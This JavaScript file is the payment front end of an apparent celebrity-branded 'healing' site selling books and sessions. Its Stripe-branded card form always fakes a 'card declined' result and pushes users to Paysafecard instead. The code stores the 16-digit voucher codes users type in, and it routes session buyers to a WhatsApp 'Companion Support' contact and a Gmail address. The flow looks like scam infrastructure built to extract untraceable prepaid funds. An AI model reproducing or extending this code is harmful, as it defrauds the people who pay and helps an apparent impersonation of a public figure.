import handleAlert, { getOS, handleRedirect, translateElementFragment } from './general.js';
import { handleAuthStateChange, getCurrentUser, db } from './auth.js';
import { doc, onSnapshot } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
import {
    getPaymentById,
    updateUserPayment,
    updateUserData,
    getUserData,
    updateUserActivity,
    addUserActivityPaysafe,
    addUserActivityBankTransfer
} from './database.js';
import { scrollToMakeVisible } from './shop.js';
import { sendEmail } from '../emailHelper.js';

// ==================== STATE MANAGEMENT ====================
function initializeState() {
    return {
        userId: null,
        methodSelected: false,
        selectedCurrency: "",
        currencyCode: "EUR",
        selectedMethod: "",
        converted: "",
        amount: 0,
        txn: "",
        charge: 0.00,
        toPay: 0,
        creditCardIndex: 1,
        creditCardSections: null,
        creditCardError: false,
        creditCardTrials: 0,
        safeIndex: 0,
        paySafeSections: null,
        cardIndex: 0,
        bankSections: null,
        senderName: "",
        paymentTimer: null,
        codes: [],
        pending: false,
        pendingIndex: 0,
        paymentStatus: null,
        statusMessage: "",
        initialContent: "",
        details: {},
        country: "",
        paymentType: "",
    };
}


const formatter = new Intl.NumberFormat('en-US');

function formatDateTime(timestamp) {
    if (!timestamp) return "";

    let date;
    date = typeof timestamp === "object" && timestamp.seconds ?
        new Date(timestamp.seconds * 1000) :
        new Date(timestamp);

    const options = {
        month: "long",
        day: "numeric",
        year: "numeric",
    };

    return (
        date.toLocaleString("en-US", options) +
        " at " +
        date.toLocaleTimeString("en-US", {
            hour: "numeric",
            minute: "2-digit",
            hour12: true,
        })
    );
}


function createCreditCardSections(state) {
    return {
        1: createCreditCardSection1(state),
    };
}

function createPaySafeSections(state) {
    return {
        1: createSafe2(state),
        2: createSafe3(state),
    }
}

function createBankSections(state) {

    return {
        1: createBankSections1(state),
        2: createBankSections2(state),
        3: createBankSections3(state),
        4: createBankSections4(),
        5: createBankSections5(state),
    };
}

// ==================== DOM CACHING ====================
function cacheDOMElements() {
    return {
        makePaymentBtn: document.getElementById("make-payment-btn"),
        paymentMethodOptions: document.querySelectorAll(
            "#payment-method-section label.option-item"
        ),
        currencyCode: document.querySelector("span.choosen-currency-code"),
        paymentDisplay: document.querySelector("section#display.parent"),
        paymentDetailsDiv: document.querySelector(".payment-summary-container#payment-details"),
    };
}

// ==================== EVENT LISTENERS ====================
function setupEventListeners(state, elements) {
    elements.paymentMethodOptions.forEach((option) => {
        option.addEventListener("click", () =>
            handlePaymentMethodClick(option, state, elements)
        );
    });

    document
        .getElementById("proceed-button")
        ?.addEventListener("click", async (e) => await handleProceedClick(e, state));


    elements.makePaymentBtn?.addEventListener("click", (e) =>
        handleMakePaymentClick(e, state, elements)
    );
}

async function getUserCountryInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        return {
            country: data.country_name || 'France',
            currency: data.currency || data.currency_code || 'EUR',
            currencyCode: data.currency_code || 'EUR',
            countryCode: data.country_code || 'FR',
            currencyName: data.currency_name || 'Euro'
        };
    } catch (error) {
        console.error('Error getting country:', error);
        return {
            country: 'France',
            currency: 'EUR',
            currencyCode: 'EUR',
            countryCode: 'FR',
            currencyName: 'Euro'
        };
    }
}

function updateSelectionStyles(selectedOption, allOptions) {
    allOptions.forEach((opt) => opt.classList.remove("selected"));
    selectedOption.classList.add("selected");
}

async function handlePaymentMethodClick(option, state, elements) {
    const method = option.className.includes("card") ?
        "Credit Card" :
        option.className.includes("paysafe") ?
        "Paysafe Card" :
        option.className.includes("bank") ?
        "Bank Transfer" :
        option.textContent.trim();

    state.methodSelected = true;
    state.selectedMethod = method.toString().replace(/\s/g, "");

    updateSelectionStyles(option, elements.paymentMethodOptions);
    checkPaymentMethodSelection(state, elements);
}

async function handleProceedClick(e, state) {
    e.preventDefault();

    const button = document.getElementById("proceed-button");
    if (!button) return;


    button.disabled = true;
    button.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>  Processing...`;

    try {
        await updateUserActivity(state.userId, {
            payment_initiated: {
                timestamp: new Date(),
                amount: state.amount,
                id: state.txn,
                paymentType: state.paymentType,
            },
            last_update: new Date(),
            opened: false,
        });
    } catch (error) {
        console.error("Failed to update user activity for payment initiation:", error);
    }

    // await convertCurrency(state)
    //     .then((value) => {
    //         value ?
    //             setTimeout(() => {
    //                 document.getElementById("payment-details")?.classList.remove("active");
    //                 document.getElementById("payment-method-section")?.classList.add("active");

    //                 button.disabled = false;
    //                 button.innerHTML = "Proceed to Payment";
    //             }, 500)

    //             :
    //             setTimeout(() => {
    //                 button.disabled = false;
    //                 button.innerHTML = "Proceed to Payment";
    //             }, 100)
    //     });


    try {
        const success = await convertCurrency(state);

        setTimeout(() => {
            if (success) {
                document.getElementById("payment-details")?.classList.remove("active");
                document.getElementById("payment-method-section")?.classList.add("active");
            }
        }, success ? 500 : 100);
    } catch (error) {
        console.error("Error during proceed:", error);
    } finally {
        button.disabled = false;
        button.innerHTML = "Proceed to Payment";

    }
}


function handleMakePaymentClick(e, state, elements) {
    e.preventDefault();

    const button = elements.makePaymentBtn;
    if (!button) return;


    button.disabled = true;
    button.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>  Processing...`;

    setTimeout(async () => {
        document
            .getElementById("payment-method-section")
            ?.classList.remove("active");

        const method = state.selectedMethod.toLowerCase();
        try {
            await updateUserActivity(state.userId, {
                method_selected: {
                    timestamp: new Date(),
                    method: state.selectedMethod,
                    id: state.txn,
                    paymentType: state.paymentType,
                },
                last_update: new Date(),
                opened: false,
            });
        } catch (err) {

        }

        if ((method.includes("credit") || method.includes("debit")) && !method.includes("safe")) {
            // handleCreditCard(state, elements);
            handleAlert('Credit card payments are currently being upgraded. Please pay via Paysafecard or Bank transfer', 'blur', true, 'Companion Support', true, [{
                text: 'Paysafecard', onClick: () => {
                    state.selectedMethod = 'paysafecard';
                    handleMakePaymentClick(e, state, elements);
return 'closeAlert';

                }
            }, {
                text: 'Bank Transfer', onClick: () => {
                    state.selectedMethod = 'bank';
                    handleMakePaymentClick(e, state, elements);
return 'closeAlert';

                }
            }])
        } else if (method.includes("safe")) {
            await handlePaySafe(state, elements);
        } else if (method.includes("bank")) {
            state.bankSections = createBankSections(state);
            handleBank(state, elements);
        }

        button.disabled = true;
    }, 1500);
}


function checkPaymentMethodSelection(state, elements) {
    if (state.methodSelected) {
        elements.makePaymentBtn.disabled = false;
    }
}

function getCurrencySymbol(currencyCode) {
    const symbols = {
        EUR: "€",
        USD: "$",
        CAD: "$",
        AUD: "$",
        GBP: "£",
        CHF: "₣",
    };
    return symbols[currencyCode] || currencyCode;
}

function initializeCreditCardState() {
    return {
        cardBrands: [
            {
                name: "Visa",
                image: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg",
                colors: ["#1a1f71", "#ffffff"],
                pattern: "linear-gradient(135deg, #1a1f71 0%, #1a1f71 50%, #f7b600 50%, #f7b600 100%)"
            },
            {
                name: "Mastercard",
                image: "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",
                colors: ["#eb001b", "#f79e1b"],
                pattern: "linear-gradient(135deg, #eb001b 0%, #eb001b 50%, #f79e1b 50%, #f79e1b 100%)"
            },
            {
                name: "American Express",
                image: "https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color.png",
                colors: ["#016fd0", "#ffffff"],
                pattern: "linear-gradient(135deg, #016fd0 0%, #016fd0 70%, #ffffff 70%, #ffffff 100%)"
            },
            {
                name: "Discover",
                image: "https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg",
                colors: ["#ff6000", "#ffffff"],
                pattern: "linear-gradient(135deg, #ff6000 0%, #ff6000 60%, #ffffff 60%, #ffffff 100%)"
            }
        ],
        detectedBrand: null
    };
}

function backToMethod(state, elements) {
    setTimeout(() => {
        state.creditCardTrials = 0;
        state.creditCardError = false;
        state.methodSelected = false;
        state.selectedMethod = "";
        state.creditCardIndex = 1;
        state.safeIndex = 0;
        state.cardIndex = 0,
            state.paymentStatus = null;
        state.statusMessage = "",

            elements.paymentDisplay.innerHTML = state.initialContent;
        document.getElementById("loading-section").classList.remove("active");

        let element = cacheDOMElements();
        setupEventListeners(state, element);

        if (element.makePaymentBtn) {
            element.makePaymentBtn.disabled = !state.methodSelected;
        }

        document.getElementById("payment-details")?.
            classList.remove("active")

        document.getElementById("payment-method-section")?.classList.add("active")
    }, 3000);
}

// ==================== CREDIT CARD HANDLING ====================
function handleCreditCard(state, elements) {
    state.creditCardSections = createCreditCardSections(state);
    const currentSection = state.creditCardSections[state.creditCardIndex];

    if (currentSection) {
        elements.paymentDisplay.innerHTML = '';
        elements.paymentDisplay.insertAdjacentHTML('beforeend', currentSection);

        const inputs = document.querySelectorAll("input");
        inputs.forEach(input => {
            input.disabled = state.creditCardTrials > 1;
        });

        document.querySelectorAll(".cc-btn").forEach(btn => {

            btn.addEventListener('click', () => {
                inputs.forEach(input => {
                    input.disabled = true;
                });

                btn.disabled = true;
                btn.innerHTML = `
                <div class="spinner-container"><div class="spinner"></div></div>
                Verifying...
                `;
                const brands = document.querySelector(".card-brands");
                brands.scrollIntoView({
                    behavior: "smooth",
                    block: "center",
                });

                setTimeout(async () => {
                    state.creditCardError = true;

                    state.creditCardTrials = state.creditCardTrials + 1;
                    scrollToMakeVisible(".card-error", ".credit-card-section");

                    btn.disabled = false;
                    btn.innerHTML = `Pay`;

                    try {
                        const userData = await getUserData(state.userId);

                        if (state.creditCardTrials > 1) {
                            btn.disabled = true;
                            state.detectedBrand = null;

                            await sendEmail(userData.details.email, 'bank-attempt', {
                                first_name: userData.details.firstName || 'there',
                                purchase_type: state.paymentType,
                                transaction_id: state.txn,
                            });
                            backToMethod(state, elements);
                        }
                        handleCreditCard(state, elements);

                    } catch (error) {
                        console.error("Error handling credit card:", error);
                    }
                }, 4000);

            });
        });

        setupCreditCardInputs(state);
    }
}

function setupCreditCardInputs(state) {
    const cardNumber = document.getElementById('card-number');
    const expiryDate = document.getElementById('expiry-date');
    const cvv = document.getElementById('cvv');
    const cardName = document.getElementById('card-name');
    const submitBtn = document.querySelector('#credit-card-details .cc-btn')
    const cardState = initializeCreditCardState();

    function detectCardBrand(number) {
        const cleaned = number.replace(/\s+/g, '');
        if (/^4/.test(cleaned)) return "Visa";
        if (/^5[1-5]/.test(cleaned)) return "Mastercard";
        if (/^3[47]/.test(cleaned)) return "American Express";
        if (/^6(?:011|5)/.test(cleaned)) return "Discover";
        return null;
    }



    function validateInputs() {
        const isCardValid = cardNumber.value.replace(/\s/g, '').length >= 15;
        const isExpiryValid = /^\d{2}\s?\/\s?\d{2}$/.test(expiryDate.value);
        const isCvvValid = cvv.value.length >= 3;
        const isNameValid = cardName.value.trim().length > 2;

        submitBtn.disabled = !(isCardValid && isExpiryValid && isCvvValid && isNameValid);
    }


    // Format card number with spaces
    if (cardNumber) {
        cardNumber.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\s+/g, '');
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,4}', 'g'))?.join(' ') || value;
            }
            e.target.value = value;

            // Detect card brand
            state.detectedBrand = detectCardBrand(value);
            validateInputs();

            // Update UI to show detected brand
            const cardBrands = document.querySelectorAll('.card-brand');
            cardBrands.forEach(brand => {
                brand.classList.remove('active');
                if (brand.querySelector('img').alt === state.detectedBrand) {
                    brand.classList.add('active');
                }
            });


            // Update card icon in input field
            const inputIcon = document.querySelector('.input-with-icon .card-icon');
            if (state.detectedBrand) {
                const brand = cardState.cardBrands.find(b => b.name === state.detectedBrand);
                if (!inputIcon) {
                    const iconDiv = document.createElement('div');
                    iconDiv.className = 'card-icon';
                    iconDiv.style.background = brand.pattern;
                    iconDiv.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
                    document.querySelector('.input-with-icon').appendChild(iconDiv);
                } else {
                    inputIcon.style.background = brand.pattern;
                    inputIcon.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
                }
            } else if (inputIcon) {
                inputIcon.remove();
            }

        });
    }



    // Format expiration date
    if (expiryDate) {
        expiryDate.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
            validateInputs();
        });
    }

    // Validate CVV
    if (cvv) {
        cvv.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '');
            validateInputs();
        });
    }

    // Validate card name
    if (cardName) {
        cardName.addEventListener('input', validateInputs);
    }

    // Initial validation
    validateInputs();
}


function saveCodeToArray(state, input) {
    if (!input) return;
    const code = input.value.trim();

    if (code.length == 16) {
        state.codes.push(code);
        return true;
    }

    return false;
}

function addNewCode(state) {
    const inputDiv = document.querySelector(".steps .inputs");
    const inputsLength = inputDiv.childElementCount;
    const userLang = (navigator.language || navigator.userLanguage || "en").split("-")[0];


    if (!inputDiv) return;

    const newInput = document.createElement("input");
    newInput.placeholder = "Type your code here";
    newInput.classList.add("paysafe-code-input");
    newInput.id = `paysafe-code-${inputsLength + 1}`;
    newInput.name = `paysafe-code-${inputsLength + 1}`;
    newInput.type = "tel";
    newInput.maxLength = "16";
    const btns = document.querySelector(".paysafe-section .continue-btn")

    inputDiv.insertAdjacentElement("beforeend", newInput);
    translateElementFragment(newInput, userLang);
    if (getOS() == "iOS") {
        btns.scrollIntoView({
            behavior: "smooth",
            block: "center",
        })
    }
    newInput.addEventListener("input", () => {
        const toggle = saveCodeToArray(state, newInput)

        btns.disabled = !toggle;
    });

}

const paySafeSteps = [
    {
        title: "How Paysafecard Works",
        message: `<h3 style="text-align:center;">🔑 Step 1 </h3> 
Buy a paysafecard voucher online or at a shop near you.
You’ll receive a paper slip or digital code containing your 16-digit code.`,
        buttons: [
            { text: "Next >", action: "next", }
        ]
    },
    {
        title: "How Paysafecard Works",
        message: `<h3 style="text-align:center;">🖊️ Step 2 </h3> Come back here and type the 16-digit code into the payment box.`,
        buttons: [
            {
                text: "< Back", action: "prev"
                , type: "secondary"
            },
            { text: "Next >", action: "next" }
        ]
    },
    {
        title: "How Paysafecard Works",
        message: `<h3 style="text-align:center;">✨ Step 3 </h3> Click Pay. That's it, your payment is complete instantly.  <br/> <br/> Ready to continue? Your book/session is waiting for you.`,
        buttons: [
            { text: "< Back", action: "prev", type: "secondary" },
            {
                text: "Back to payment",
                action: "closeAlert"
            }
        ]
    }
];

function showFlow(steps, index = 0) {
    const step = steps[index];

    handleAlert(
        step.message,
        "blur",
        true,
        step.title,
        true,
        step.buttons.map(btn => ({
            text: btn.text,
            onClick: btn.action === "next"
                ? () => showFlow(steps, index + 1)
                : btn.action === "prev"
                    ? () => showFlow(steps, index - 1)
                    : btn.action,
            type: btn.type || "primary",
        })),
        "row"
    );
}

function stepsAlerts() {
    showFlow(paySafeSteps);
}

const userLang = (navigator.language || navigator.userLanguage || "en").split("-")[0];
const LINKS = {
    online: {
        "en": "https://www.paysafecard.com/en-gb/buy-paysafecard-online-3/",
        "fr": "https://www.paysafecard.com/fr-fr/acheter-paysafecard-en-ligne/",
        "es": "https://www.paysafecard.com/es-es/comprar-paysafecard-online/",
        "de": "https://www.paysafecard.com/de-de/paysafecard-online/",
        "it": "https://www.paysafecard.com/it-it/acquista-paysafecard-online/",
        "pt": "https://www.paysafecard.com/pt-pt/comprar-paysafecard-online/",
    },
    store: {
        "en": "https://www.paysafecard.com/en-us/find-sales-outlet/",
        "fr": "https://www.paysafecard.com/fr-fr/trouver-un-point-de-vente/",
        "es": "https://www.paysafecard.com/es-es/buscar-puntos-de-venta/",
        "de": "https://www.paysafecard.com/de-de/verkaufsstelle-finden-1/",
        "it": "https://www.paysafecard.com/it-it/trova-un-punto-vendita/",
        "pt": "https://www.paysafecard.com/pt-pt/pesquisar-pontos-de-venda/",
    }
}

const safeFlow = (state) => {
    return {
        start: {
            message: "Do you need help finding a shop near you to buy a Paysafecard voucher, or would you like guidance on how to use it to complete your payment for your book/session?",
            title: "🌸 <br/> Companion Support",
            buttons: [
                { text: "Yes, guide me", action: "guide" },
                { text: "No, thank you", action: "closeAlert", type: "secondary" }
            ]
        },
        guide: {
            message: "We're here to make this easy for you. <br/> Please choose what you need right now:",
            title: "🌸 Companion Support",
            buttons: [
                {
                    text: "Buy paysafecard online", action: () => {
                        updateUserActivity(state.userId, {
                            paysafe_guideline: {
                                timestamp: new Date(),
                                action: 'Buy paysafecard online'
                            }
                        });
                        window.open(`${LINKS.online[userLang] || LINKS.online.en}`);
                        return "closeAlert";
                    }, type: "secondary"
                },
                {
                    text: "Find a Store Near Me", action: () => {
                        updateUserActivity(state.userId, {
                            paysafe_guideline: {
                                timestamp: new Date(),
                                action: 'Find a Store Near Me'
                            }
                        });

                        window.open(`${LINKS.store[userLang] || LINKS.store.en}`);
                        return "closeAlert";
                    }, type: "secondary"
                },
                {
                    text: "Show Me How Paysafecard Works", action: () => {
                        updateUserActivity(state.userId, {
                            paysafe_guideline: {
                                timestamp: new Date(),
                                action: 'Show Me How Paysafecard Works'
                            }
                        });
                        stepsAlerts()
                    },
                    type: "secondary"
                },
                {
                    text: "Talk to us",
                    action: () => {
                        updateUserActivity(state.userId, {
                            paysafe_guideline: {
                                timestamp: new Date(),
                                action: 'Talk to us'
                            }
                        });

                        handleAlert(`Need help? Write to us now and explain your problem. Our team will respond quickly and fix it for you.  <br/><br/>
                            <div style="display:flex; gap:6px;"> 
                            <i class="bi bi-envelope"></i> Email Us </div>
                            `, "blur", true, "✉️ Companion Support", true, [{
                            text: "Message Now", onClick: () => {
                                handleRedirect("mailto:healingwithcharlottecasiraghi@gmail.com");

                                return "closeAlert"
                            }
                        }]);

                    }, type: "secondary"
                }
            ],
            arrange: "column"
        }
    }
};

function runFlow(flow, state = "start") {
    const step = flow[state];
    handleAlert(
        step.message,
        "blur",
        true,
        step.title,
        true,
        step.buttons.map(btn => ({
            text: btn.text,
            onClick: typeof btn.action === "string"
                ? btn.action === "closeAlert" ? "closeAlert" : () => runFlow(flow, btn.action)
                : btn.action,
            type: btn.type,
        })),
        {},
        step.arrange
    );
}

function safeAlerts(state) {
    runFlow(safeFlow(state), "start");
}


//==================== PAYMENT POLLING & RESULTS ====================>>>>

const delay = ms => new Promise(res => setTimeout(res, ms));

let attempts = 0;
async function pollForPaymentStatus(state) {
    let payment = await getPaymentById(state.userId, state.txn);

    while (payment === null && attempts < 40) {
        await delay(2500);
        attempts++;

        payment = await getPaymentById(state.userId, state.txn);
    }
    return payment;
}

async function savePaymentData(state) {
    const { userId, txn } = state;

    if (!txn || !userId) {
        handleAlert("Missing transaction ID or User ID. Skipping save.", "blur", false, "", true, [{ text: "OK", onClick: "closeAlert" }]);

        console.warn("Missing transaction ID or User ID. Skipping save.");
        return false;
    }

    const title = state.paymentType.toLowerCase() == "session" ? "Booked a session" : "Bought a Book";
    const index = state.selectedMethod.toLowerCase().includes("safe") ? 2 : 1;

    const paymentData = {
        id: txn,
        paymentType: state.paymentType,
        pending: true,
        title: title || "N/A",
        price: state.amount,
        currency: state.currencyCode,
        converted: state.toPay,
        method: state.selectedMethod,
        status: state.paymentStatus,
        statusName: state.paymentStatus === true ? "Completed" : (state.paymentStatus === false ? "Failed" : "Pending"),
        statusMessage: state.statusMessage || "",
        date: new Date(),
        index: index,
        userId: userId,
    };
    // description: state.details.description,

    try {
        await updateUserPayment(userId, txn, paymentData);
        return true;
    } catch (error) {
        console.error("Error saving payment data:", error);
        handleAlert(`Could not save payment data, because: ${error}`, "blur", false, "", true, [{ text: "OK", onClick: "closeAlert" }]);
    }
    return false;
}

function triggerVibration() {
    if (navigator.vibrate) {
        navigator.vibrate(800);
    }
}

async function showResultScreen(state, elements, finalPayment) {
    let resultHTML;

    if (!finalPayment || finalPayment.status == null) {
        const unsub = onSnapshot(doc(db, "users", state.userId, 'payments', state.txn), (doc) => {
            const payment = doc.data();
            if (payment && payment.status !== null) {
                unsub();
                showResultScreen(state, elements, payment);
            }
        });

        resultHTML = `
    <div class="payment-section paysafe-section active" id="paysafe-thank-you">
            <div class="paysafe-header">
                <div class="logo">
                    <img src="/src/images/paysafe.png" alt="Paysafe Logo">
                </div>
                <h2>Thank you.</h2>
            </div>

            <div class="steps">
                <p class="verification-text">Your Paysafecard payment is being processed. You will receive a
                    confirmation email once the code is verified.</p>
            </div>

            <div class="proceed-div">
                <a href="/html/main/User.html" class="continue-btn">OK</a>
            </div>
        </div>
    `
    } else {
        // Update state with the final payment details
        state.paymentStatus = finalPayment.status;
        state.statusMessage = finalPayment.statusMessage;
        await savePaymentData(state);

        const { status, statusMessage, paymentType } = finalPayment;
        triggerVibration();

        // Determine result content based on status
        const isSuccess = status === true;

        const resultTitle = isSuccess && paymentType.toLowerCase() !== "session" ? 'Payment Successful' : isSuccess && paymentType.toLowerCase() === "session" ? "✨ Your Session is Confirmed" : (statusMessage.includes("used") ? 'Code Already Used' : (statusMessage.includes("incomplete") ? 'Payment Not Fully Covered' : "Incorrect Code"));

        const resultMessage = isSuccess && paymentType.toLowerCase() !== "session" ?
            'Your payment with Paysafecard is complete.<br/><br/>Thank you for your trust.' : isSuccess && paymentType.toLowerCase() === "session" ? "Thank you for booking your session. <br/> To uphold the standard of discretion, care, and personal attention associated with this experience, all final confirmations are handled through Companion Support on WhatsApp. <br/> For security and protocol, please send a message to Companion Support so they may: <br/> • Officially verify and confirm your appointment <br/> •Securely facilitate your private connection to Charlotte’s personal line <br/> • Provide your session protocol and preparation notes <br/> • Ensure you feel welcomed, oriented, and personally supported <br/> This final step is required to complete your reservation and guarantee your place. <br/> It protects the intimacy and integrity of this experience from the very first moment.<br/> Tap below to message Companion Support on WhatsApp <br/> A private assistant will respond and guide your connection with grace and confidentiality." :
                (statusMessage.includes("used") ?
                    "The Paysafecode you entered has already been used. Please try a different code." : (statusMessage.includes("incomplete") ? `Only part of the payment went through. The code does not cover the full amount. <br/> ${statusMessage}` :
                        "The Paysafecard code you entered is not correct. Please check the digits and try again."));

        resultHTML = `
        <div class="payment-section paysafe-section active  ${isSuccess && paymentType.toLowerCase() === 'session' ? 'session' : ''}" id="paysafe-outcome">
        ${paymentType.toLowerCase() !== 'session' ? `<div class="paysafe-header">
                <div class="logo"><img src="/src/images/paysafe.png" alt="Paysafe Logo"></div>
            </div>` : ''}
            <div class="outcome-section">
                <i class="${isSuccess ? paymentType.toLowerCase() === "session" ? 'session' : 'bi bi-check-circle-fill' : (!isSuccess && statusMessage.includes("incomplete") ? 'bi bi-dash-circle-fill' : 'bi bi-x-circle-fill')}"></i>
                <h1>${resultTitle}</h1>
            </div>
            <div class="steps ${isSuccess && paymentType.toLowerCase() === 'session' ? 'session' : ''}">
                <p class="verification-text ${isSuccess && paymentType.toLowerCase() === 'session' ? 'session' : ''}">${resultMessage}</p>
            </div>
            <div class="proceed-div">
                ${isSuccess ? paymentType.toLowerCase() === "session" ?
                `<a href="https://wa.me/33745624634" target="_blank" class="continue-btn facebook "> <i class="bi bi-whatsapp"></i> Message Me on WhatsApp</a>` :
                `<a href="/html/main/ViewBook.html" class="continue-btn success">View Book</a>` :
                (
                    `<button class="continue-btn try-again">${!isSuccess && statusMessage.includes("incomplete") ? "Add Another Code" : "Try Again"
                    } </button>`)
            }
                <p class="small-text">${isSuccess ?
                `A confirmation has been sent to your email.` :
                `Need help? <a href="mailto:healingwithcharlottecasiraghi@gmail.com" style="color:var(--link); font-weight:bold;">Contact Support</a>`
            }</p>
            </div>
        </div>`;
    }

    elements.paymentDisplay.innerHTML = resultHTML;
    const tryAgainBtn = document.querySelector(".continue-btn.try-again");

    if (tryAgainBtn) {
        tryAgainBtn.addEventListener("click", () => {
            const initial = tryAgainBtn.innerHTML;
            tryAgainBtn.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>`;
            backToMethod(state, elements);
            tryAgainBtn.innerHTML = initial;
        });
    }
}

async function handlePaySafe(state, elements) {
    state.paySafeSections = createPaySafeSections(state);

    const currentSection = state.paySafeSections[state.safeIndex + 1];

    if (state.safeIndex === 1 && state.pending) {
        const finalPayment = await pollForPaymentStatus(state);
        await showResultScreen(state, elements, finalPayment);
    } else if (currentSection) {

        if (state.safeIndex == 1) {
            await updateUserData(state.userId, { codes: state.codes });

            const userData = await getUserData(state.userId);
            await addUserActivityPaysafe(state.userId, {
                timestamp: new Date(),
                amount: state.amount,
                id: state.txn,
                currency: state.currencyCode,
                method: state.selectedMethod,
                paymentType: state.paymentType,
                codes: state.codes,
                status: state.paymentStatus,
            });

            await sendEmail(userData.details.email, 'payment-processing', {
                first_name: userData.details.firstName,
                purchase_type: state.paymentType,
                transaction_id: state.txn,
            });
            if (state.paymentStatus !== true) {
                await savePaymentData(state);
            }
        };

        elements.paymentDisplay.innerHTML = "";
        elements.paymentDisplay.insertAdjacentHTML("beforeend", currentSection);

        const btns = document.querySelectorAll(".paysafe-section .continue-btn")

        btns.forEach(btn => btn.addEventListener("click", () => {

            btn.disabled = true;
            btn.innerHTML = `
                <div class="spinner-container"><div class="spinner"></div></div>
                ${state.safeIndex !== 1 ? "Loading..." : "Verifying..."}
                `;

            setTimeout(async () => {
                await handlePaySafe(state, elements)
            }, 2000);

        }));


        if (state.safeIndex == 0) {
            btns[0].disabled = true;
            state.pending = false;

            const firstInput = document.querySelector(".steps input.paysafe-code-input");
            firstInput.addEventListener("input", () => {
                const toggle = saveCodeToArray(state, firstInput)

                btns[0].disabled = !toggle;
            }
            );

            const addButton = document.querySelector("button.another-code");
            addButton.addEventListener('click', () => {
                addNewCode(state)
            });


            setTimeout(() => {
                safeAlerts(state);
            }, 3000);
        };

        state.safeIndex = state.safeIndex <= 0 ? state.safeIndex + 1 : 1;
    }

}


async function convertCurrency(state) {
    const EXCHANGE_RATE_API = "https://api.exchangerate-api.com/v4/latest/EUR";

    try {
        const response = await fetch(EXCHANGE_RATE_API);
        const data = await response.json();
        const rates = data.rates;

        if (state.currencyCode !== "EUR") {
            if (state.currencyCode && state.currencyCode in rates) {
                const rate = rates[state.currencyCode];
                state.converted = (state.amount * rate).toFixed(2);
                // state.charge = (0.98 * rate).toFixed(2);

                state.toPay = (parseFloat(state.converted) + parseFloat(state.charge)).toFixed(2);
            } else {
                console.error("Currency conversion not available");
                alert("Currency conversion not available");
            }
        } else {
            state.toPay = (parseFloat(state.amount) + parseFloat(state.charge)).toFixed(2);
        }
        return true;
    } catch (error) {
        console.error("Conversion error:", error);
        handleAlert(`An error occured because of: ${error} `);

        state.converted = (state.amount).toFixed(2);
        state.toPay = (parseFloat(state.converted) + parseFloat(state.charge)).toFixed(2);

    }
    return false;
}


// ==================== CREDIT CARD UI TEMPLATES ====================
function createCreditCardSection1(state) {
    const cardState = initializeCreditCardState();

    return `
    <div class="payment-section credit-card-section active" id="credit-card-details">
        
${state.creditCardError || state.creditCardTrials > 1 ?
            `
        <div class="card-error">
        <div class="card-error-div">

<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-triangle-fill" viewBox="0 0 16 16">
  <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5m.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2"/>
</svg>
        <div class="error-upper">
 <p>
Your card was declined. ${state.creditCardTrials > 1 ? `Try another payment method
            ` : `Try another credit or debit card.`}
            </p>
<p>Code: card_declined</p>
</div>
        </div>
        </div>`
            : ``
        }
        <div class="cc-form">
            <div class="card-brands">
                ${cardState.cardBrands.map(brand => `
                    <div class="card-brand ${state.detectedBrand === brand.name ? 'active' : ''}" >
                        <img src="${brand.image}" alt="${brand.name}">
                    </div>
                `).join('')}
            </div>

            <div class="form-group">
                <label for="card-number">Card number</label>
                <div class="input-with-icon">
                    <input type="tel" id="card-number" placeholder="" maxlength="19" class="card-input">

                    ${state.detectedBrand ? `<div class="card-icon">
                        <img src="${cardState.cardBrands.find(b => b.name === state.detectedBrand).image}" alt="${state.detectedBrand}"/>
                    </div>` : ''}
                </div>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="expiry-date">MM / YY</label>
                    <input type="tel" id="expiry-date" placeholder="" maxlength="5" class="card-input">
                </div>
                <div class="form-group">
                    <label for="cvv">CVC</label>
                    <input type="tel" id="cvv" placeholder="" maxlength="3" class="card-input">
                </div>
            </div>
            
            <div class="form-group">
                <label for="card-name">Name on card</label>
                <input type="text" id="card-name" placeholder="" class="card-input">
            </div>
            
           <!--div class="amount-display">
                <p>Amount to charge: <strong>${getCurrencySymbol(state.currencyCode) || state.currencyCode} ${formatter.format(state.toPay)}</strong></p>
            </div-->
        </div>

        <div class="proceed-div">
            <button class="continue-btn cc-btn" disabled>Pay</button>
            <div class="stripe-branding">
                <span>Powered by</span>
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Stripe">
            </div>
        </div>
    </div>`;
}

///========FOR PAYSAFE========>
function createSafe1() {
    return `<div class="payment-section paysafe-section active" id="paysafe-instructions">
            <div class="paysafe-header">
                <!-- <div class="logo">
                <img src="/src/images/paysafe.png" alt="Paysafe Logo">
            </div> -->
                <h2>How to Pay with Paysafecard</h2>
                <p class="small-text">Simple, Safe & Easy - No credit or debit card needed</p>
            </div>

            <div class="steps">
                <div class="step">
                    <img src="/src/images/card.jpg" class="bi bi-bag-fill" alt=""/>
                    <div class="step-text">

                        <p class="step-header">Step 1: <br />
                            Buy a Paysafecard Voucher
                        </p>

                    <p class="step-text-under">
